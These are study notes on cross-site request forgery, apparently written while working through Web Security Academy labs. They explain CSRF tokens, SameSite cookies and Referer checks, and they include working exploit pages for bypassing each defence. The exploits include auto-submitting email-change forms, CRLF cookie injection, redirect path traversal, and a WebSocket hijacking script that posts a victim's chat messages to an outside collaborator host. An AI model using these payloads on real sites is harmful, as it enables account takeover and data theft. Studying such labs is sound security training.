# CSRF

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

---

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally.  
For example:

-change the email address on their account  
-to change their password  
-or to make a funds transfer.

the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

---

For a CSRF attack to be possible, three key conditions must be in place:

## 1) A relevant action.

- a privileged action  such as modifying permissions for other users  
- user-specific data (such as changing the user's own password)

---

## 2) Cookie-based session handling:

Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who made the requests.

- There is no other mechanism in place for tracking sessions or validating user requests.

---

## 3) No unpredictable request parameters.

The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. for example when changing user's password , requests u to input the old one

---

### Example request

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

---

to do the attack :  

suppose the victim user was logged in the target website   so a session will be created  

user -> attacker'page -> https://vulnerable-website.com/email/change (POST)  

the attacker'page :

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

---

instead of building a whole html page ,we will use CSRF PoC generator that exists in burp suite pro,

check this :  
https://portswigger.net/burp/documentation/desktop/tools/engagement-tools/generate-csrf-poc

---

#####################################
Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.
#####################################

---

# Lab: CSRF vulnerability with no defenses

visit the login page and submits the following credentials : wiener/peter

using burp's proxy update your email and submit  

notice that the request covers the 3 key conditions.

now right-click on the request -> select Engagement tools -> Generate CSRF PoC

use a new email then copy the generated html , then go to exploit server and paste it in the body -> store the exploit then deliver it to client.

u can view the exploit and u will see that the email changed to whatever u put.

---

#####################################
How to deliver a CSRF exploit
#####################################

1) the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website. This might be done by feeding the user a link to the website, via an email or social media message.

2) some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable website.

<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">

---

#####################################
XSS vs CSRF
#####################################

XSS allows an attacker to execute arbitrary JavaScript within the browser of a victim user.

CSRF allows an attacker to induce a victim user to perform actions that they do not intend to.

The consequences of XSS vulnerabilities are generally more serious than for CSRF vulnerabilities:

- CSRF only applies to a subset of actions that a user able to perfrom  
- a successful XSS exploit can normally induce a user to perform any action that the user is able to perform, regardless of the functionality in which the vulnerability arises.  
- CSRF can be described as a "one-way" vulnerability, in that while an attacker can induce the victim to issue an HTTP request, they cannot retrieve the response from that request. Conversely, XSS is "two-way", in that the attacker's injected script can issue arbitrary requests, read the responses, and exfiltrate data to an external domain of the attacker's choosing.

# CSRF Token

CSRF Token :  a unique, secret, and unpredictable string that a server-side application generates and assigns to a user's session.

If you visit a malicious website, it could secretly send a background request (like "change password" or "transfer funds") to your bank's server. Because your browser automatically includes your valid login cookies, the bank's server will assume you authorized the request and execute it.

---

## How it Works:

### Generation:
When you load a form on a legitimate website, the server generates a random token and embeds it into the HTML (usually as a hidden input field). It also stores this token in your user session on the server.

### Submission:
When you submit the form, the token is sent back to the server along with your authentication cookies.

### Validation:
The server compares the submitted token with the token stored in your session. If they match: The request is approved. If the token is missing or incorrect: The server rejects the request.

Because of the browser's Same-Origin Policy, a malicious website cannot read the HTML or cookies belonging to another domain (e.g., your bank's website). Therefore, the attacker cannot guess or steal the valid CSRF token to include in their forged request.

---

#####################################
PREVENT XSS ATTACKS USING CSRF TOKENS
#####################################

for reflected XSS vulnerability:
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>

suppose u send the link to a victim user.

the server will rejects the request because the csrf token is not valid (csrf token doesn't match with the one stored in the server that attached to that user).

---

Some important caveats arise here:

- If a reflected XSS vulnerability exists anywhere else on the site within a function that is not protected by a CSRF token, then that XSS can be exploited in the normal way.

- If an exploitable XSS vulnerability exists anywhere on a site, then the vulnerability can be leveraged to make a victim user perform actions even if those actions are themselves protected by CSRF tokens. the attacker's script can request the relevant page to obtain a valid CSRF token, and then use the token to perform the protected action.

- CSRF tokens do not protect against stored XSS vulnerabilities.

---

# Common defences against CSRF

CSRF tokens - When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.

SameSite cookies - is a browser security mechanism that tells a browser whether to send a cookie in cross-site requests. It is primarily used to protect websites from Cross-Site Request Forgery (CSRF) attacks.

Referer-based validation - Some applications uses HTTP Referer header to validate whether the request originated from the application's own domain.

---

# Bypassing CSRF token validation

CSRF vulnerabilities typically arise due to flawed validation of CSRF tokens.

---

## Validation depends on request method

Some applications correctly validate the token when the request uses the POST method but skip validation when the GET method is used.

### Lab: CSRF where token validation depends on request method

Login using wiener/peter, update email and intercept request.

Change method to GET:

```http
GET https://vuln-website/change-email?email=wiener2@gmail.com&csrf=12awd123dwdqd
```

Right-click → Generate CSRF PoC → deliver exploit.

---

## Validation depends on token being present

Some applications validate token only if it exists.

### Lab: CSRF where token validation depends on token being present

Try deleting CSRF token completely → request works.

Then generate CSRF PoC → deliver exploit.

---

## CSRF token not tied to session

Some applications accept any valid token from a global pool.

### Lab: CSRF where token is not tied to user session

Reuse token from another account → works.

---

## CSRF token tied to non-session cookie

Some systems bind CSRF token to a separate cookie (csrfKey).

If attacker can set cookie → CSRF bypass possible.

---

### Example request

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=AAA; csrfKey=BBB

csrf=BBB&email=test@example.com
```

---

## Lab: CSRF where token tied to non-session cookie

CRLF injection used to set cookie:

```text
%0D%0ASet-Cookie: csrfKey=ATTACKER_VALUE
```

Exploit:

```html
<img src="https://LAB/?search=test%0D%0ASet-Cookie:%20csrfKey=ATTACKER"
onerror="document.forms[0].submit()">
```

---

## CSRF token duplicated in cookie (double submit)

Token stored in both cookie and request parameter.

Server checks only equality.

### Example

```http
Cookie: csrf=ABC
csrf=ABC
```

If attacker can set cookie → bypass possible.

---

### Lab: CSRF where token duplicated in cookie

Inject cookie via CRLF:

```text
%0D%0ASet-Cookie: csrf=VALUE; SameSite=None
```

Exploit uses:

```html
<img src="https://LAB/?search=...Set-Cookie..."
onerror="document.forms[0].submit()">
```
# SameSite Cookie

## the difference between the site and origin:

---

## Origin

An origin consists of:

scheme + hostname + port

https://facebook.com:443

https://facebook.com:8080

---

URL comparison:

| URL | origin |
|-----|--------|
| https://example.com | https://example.com:443 |
| http://example.com | http://example.com:80 |
| https://example.com:8080 | https://example.com:8080 |
| https://api.example.com | https://api.example.com:443 |

---

Two URLs have the same origin only if all three match:

- Protocol (HTTP/HTTPS)  
- Hostname  
- Port  

---

Same Origin examples:

https://example.com → https://example.com/account (YES)

https://example.com → http://example.com (NO)

https://example.com → https://api.example.com (NO)

https://example.com → https://example.com:8080 (NO)

---

## Site

A site is generally:

scheme + registrable domain (eTLD+1)

---

| URL | Site |
|-----|------|
| https://app.example.com | https://example.com |
| https://api.example.com | https://example.com |
| https://blog.example.com | https://example.com |

---

These are:

different origin  
same site  

---

We use origin in SOP (Same Origin Policy)

JavaScript on:

https://app.example.com

cannot read responses from:

https://api.example.com

unless CORS allows it.

---

We use site in SameSite Cookies

---

If cookie is set on:

https://app.example.com

Request to:

https://api.example.com

is considered same-site.

---

Set-Cookie: session=abc; SameSite=Lax

can still be sent between subdomains because they are same site.

---

# How does SameSite work?

SameSite controls whether cookies are sent in cross-site requests.

Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict

---

## SameSite levels:

- Strict  
- Lax  
- None  

---

## Strict

cookies will NOT be sent in any cross-site requests.

If request originates from different site → cookie not included.

Used for sensitive actions.

---

## Lax

cookies are sent in cross-site requests ONLY if:

- request uses GET  
- request is top-level navigation  

---

### Top-level navigation examples:

Click link:

<a href="https://victim.com/account">My Account</a>

---

Type URL:

https://victim.com

---

JavaScript redirect:

window.location = "https://victim.com/account";

---

Form submission:

```html
<form action="https://victim.com/change-email" method="GET">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
```

---

Auto-submit form:

```html
<form id="f" action="https://victim.com/change-email" method="GET">
    <input type="hidden" name="email" value="attacker@example.com">
</form>

<script>
document.getElementById('f').submit();
</script>
```

---

## Not top-level navigation:

Image request:

<img src="https://victim.com/delete-account">

---

Background form submit:

<form action="https://victim.com/change-email" method="GET">

---

POST requests are more likely CSRF targets.

Cookies not included in background requests like images/iframes/scripts.

---

## None

disables SameSite restrictions completely.

Cookie is sent in all requests including third-party sites.

---

Must include Secure attribute:

Set-Cookie: trackingId=ABC; SameSite=None; Secure

---

# Bypassing SameSite Lax restrictions using GET requests

If server accepts GET instead of POST, CSRF still works.

```html
<script>
document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

---

## Method override trick

Some frameworks allow overriding method using _method:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

---

# Lab: SameSite Lax bypass via method override

Change POST → GET in CSRF PoC.

GET request may include cookie but endpoint rejects method.

Use _method=POST to bypass.

---

# Bypassing SameSite using client-side redirect gadgets

If SameSite=Strict → cookies not sent cross-site.

Need redirect gadget inside target site.

Flow:

attacker → site page → same site page → action

---

# Lab: SameSite Strict bypass via client-side redirect

Find redirect in blog confirmation page:

/post/comment/confirmation?postId=x

JS builds redirect using postId.

Exploit path traversal:

```text
/post/comment/confirmation?postId=1/../../my-account/change-email?email=test%40mail.com%26submit=1
```

---

Exploit:

```html
<script>
document.location="https://LAB/post/comment/confirmation?postId=10/../../my-account/change-email?email=test@gmail.com%26submit=1";
</script>
```

---

Server-side redirects still enforce SameSite restrictions.

---

## sibling domains

https://blog.example.com  
https://admin.example.com  

same site but different origin

---

XSS in one subdomain can affect another via same-site cookies.

---

## CSWSH (Cross-Site WebSocket Hijacking)

WebSocket handshake can be abused if no CSRF protection exists.

---

# Lab: SameSite Strict bypass via sibling domain

WebSocket exploit:

```javascript
var ws = new WebSocket('wss://LAB/chat');

ws.onopen = function(){
ws.send("READY");
};

ws.onmessage = function(event){
fetch('https://collaborator.oastify.com',{
method:'POST',
mode:'no-cors',
body:event.data
});
};
```

---

CMS sibling domain found → XSS injected into username:

```html
<script>
var ws = new WebSocket('wss://LAB/chat');

ws.onopen = function(){ ws.send("READY"); };

ws.onmessage = function(event){
fetch('https://collaborator.oastify.com',{
method:'POST',
mode:'no-cors',
body:event.data
});
};
</script>
```

---

# SameSite Lax bypass via cookie refresh (120-second rule)

Chrome default SameSite=Lax applies to cookies without attribute.

Exception:

- first 120 seconds after cookie issued
- cookie may be sent in top-level POST

---

## Attack idea:

1. force login → new cookie  
2. exploit within 120 seconds  
3. browser sends cookie anyway  

---

Popup refresh trick:

```javascript
window.onclick = () => {
    window.open('https://vulnerable-site.com/login/sso');
};
```

---

# Lab: SameSite Lax bypass via cookie refresh

Steps:

- trigger /social-login
- OAuth issues fresh session cookie
- open popup via click
- wait 5 seconds
- submit CSRF

```html
<form method="POST" action="https://LAB/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>

<script>
window.onclick = () => {
    window.open('https://LAB/social-login');
    setTimeout(() => document.forms[0].submit(), 5000);
};
</script>
```
# Bypassing Referer-based CSRF defenses

some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain.

Referer header : is an optional request header that contains the URL of the web page that linked to the resource that is being requested.

---

## Validation of Referer depends on header being present

Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.

an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request.
to achieve this : 

using a META tag within the HTML page that hosts the CSRF attack:

<meta name="referrer" content="never"> // this tells the browser to not send the referrer header in http request

---

## Lab: CSRF where Referer validation depends on header being present

login and intercept the request : u will notice that the session cookie has a samesite = none  means the browser will include it even if  the request comes from a cross site .

go to my account -> change the email and intercept it :  notice that there are no csrf defenses such as csrf token , ...etc
so this site is vulnerable to csrf attacks now lets go and craft a csrf exploit html page 

right-click on the change email request  -> select engagement tools -> generate csrf poc -> copy the html 
go to exploit server -> store .

click view exploit and intercept the request: notice that the application shows that the referrer header invalid. 
this maybe means that the referrer should include the url from the same site  not from a cross one.

try to delete the referrer header and send the request : it worked 

so now we need to find a way to tell the user's browser to not include the referrer header in the request.

using the meta tag html element 

<meta name="referrer" content="never">   // this tells the browser to not send the referrer header in the request 

so add it inside the header element 
```html
<html>
  <header><meta name="referrer" content="never"></header>
  <body>
    <form action="https://0a5200c203eb20c380cf127900d0002f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="winee11@gmail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
---

## Validation of Referer can be circumvented

1) if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:

http://vulnerable-website.com.attacker-website.com/csrf-attack

2) if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:

http://attacker-website.com/csrf-attack?vulnerable-website.com

but here for  2) approach   to reduce the risk of sensitive data being leaked  browsers strip the query string from the Referer header by default.
so to solve this problem : 

1) add inside the header element <meta name="referrer" content="unsafe-url">   which tells the browser to include the full url path with its query parameters 

2) in the header http request add referrer-policy: unsafe-url

---

## Lab: CSRF with broken Referer validation

login and intercept the request : u will notice that the session cookie has a samesite = none  means the browser will include it even if  the request comes from a cross site .

go to my account -> change the email and intercept it :  notice that there are no csrf defenses such as csrf token , ...etc
so this site is vulnerable to csrf attacks now lets go and craft a csrf exploit html page 

right-click on the change email request  -> select engagement tools -> generate csrf poc -> copy the html 
go to exploit server -> store .

click view exploit and intercept the request: notice that the application shows that the referrer header invalid. 
this maybe means that the referrer should include the url from the same site  not from a cross one.

try delete the referer header -> not worked 

change the referer  header value to:

Referer: http://attacker-website.com/exploit/?0aac003104067e1c809db7e300100083.web-security-academy.net   -> it worked 

so the application validates if its domain exist any where in the referer header 

so now we need to : 

1) use history.push()  to add /?0aac003104067e1c809db7e300100083.web-security-academy.net

2) use meta tag to tell the browser to include the full url path including its string query parameters 

```html
<html>
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
    <form action="https://0aac003104067e1c809db7e300100083.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener23@gmail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0aac003104067e1c809db7e300100083.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
